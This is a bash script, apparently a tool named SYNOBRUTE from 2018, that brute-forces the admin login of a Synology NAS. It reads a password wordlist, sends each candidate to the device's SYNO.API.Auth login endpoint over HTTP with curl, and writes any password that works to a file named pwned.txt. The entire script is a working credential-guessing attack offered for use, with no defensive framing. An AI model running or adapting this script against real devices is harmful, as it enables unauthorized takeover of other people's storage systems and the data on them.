#!/bin/bash
echo "███████╗██╗   ██╗███╗   ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗"
echo "██╔════╝╚██╗ ██╔╝████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝"
echo "███████╗ ╚████╔╝ ██╔██╗ ██║██║   ██║██████╔╝██████╔╝██║   ██║   ██║   █████╗  "
echo "╚════██║  ╚██╔╝  ██║╚██╗██║██║   ██║██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  "
echo "███████║   ██║   ██║ ╚████║╚██████╔╝██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗"
echo "╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝"
echo " "
echo "SYNOBRUTE - evolutio - 2018"
 
date
echo ""
echo " ./bruteforce.sh password.txt 192.168.1.101"
echo ""
cat $1 |  while read output
do
[[ -z "$1" ]] && { echo "Parameter 1 is empty - fichier.txt " ; exit 1; }
[[ -z "$2" ]] && { echo "Parameter 2 is empty - ip_adress_nas " ; exit 1; }
echo "tentative avec le mot de passe $output sur $2"
syno_user="admin"
syno_pwd=$output
syno_url=$2 # eg 192.168.1.100
vAuth=2
touch pwned.txt
# Get Paths (recommended by Synology for further update)
curlResult=$(curl -s "http://${syno_url}:5000/webapi/query.cgi?api=SYNO.API.Info&method=Query&version=1&query=SYNO.API.Auth,SYNO.SurveillanceStation.Camera")
authPath=$(echo "$curlResult" | jq -r '.["data"]["SYNO.API.Auth"]["path"]')
#  login
curlResult=$(curl -s "http://${syno_url}:5000/webapi/${authPath}?api=SYNO.API.Auth&method=Login&version=${vAuth}&account=${syno_user}&passwd=${syno_pwd}&session=SurveillanceStation&format=sid")
if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'true' ]]; then 
				echo -e "\033[32m ----------------------------------- \033[0m"				
				echo -e "\033[32m succes login for $syno_url \033[0m"
				echo -e "\033[32m ----------------------------------- \033[0m"				
				echo ""
                echo "login is admin $output" >> pwned.txt
                exit 0
fi
if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'false' ]]; then
		echo -e "\033[31mError on login : bad password !!! \033[0m"
		echo ""
else
		echo -e "\033[31mError on login \033[0m"
		echo ""
fi
SID=$(echo "$curlResult" | jq -r '.["data"]["sid"]')				
curl -s "http://${syno_url}:5000/webapi/${authPath}?api=SYNO.API.Auth&method=Logout&version=${vAuth}&_sid=${SID}" > /dev/null 2>&1
done
